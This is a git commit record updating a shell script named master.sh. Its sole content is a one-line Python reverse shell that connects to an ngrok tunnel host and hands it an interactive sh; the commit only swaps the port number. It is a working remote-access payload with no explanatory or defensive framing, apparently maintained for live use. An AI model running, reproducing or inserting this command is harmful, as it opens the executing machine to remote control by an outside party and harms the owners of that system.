7833625018c1f60c6e9aec769ac6b7b4e38b7c33
DrixAxe <88616717+DrixAxe@users.noreply.github.com>
2024-05-19 12:59:13 +0300

    Update master.sh

--- master.sh
+++ master.sh
@@ -1,1 +1,1 @@
-$(export RHOST="0.tcp.eu.ngrok.io";export RPORT=15787;/usr/bin/python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")')
+$(export RHOST="0.tcp.eu.ngrok.io";export RPORT=17122;/usr/bin/python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")')
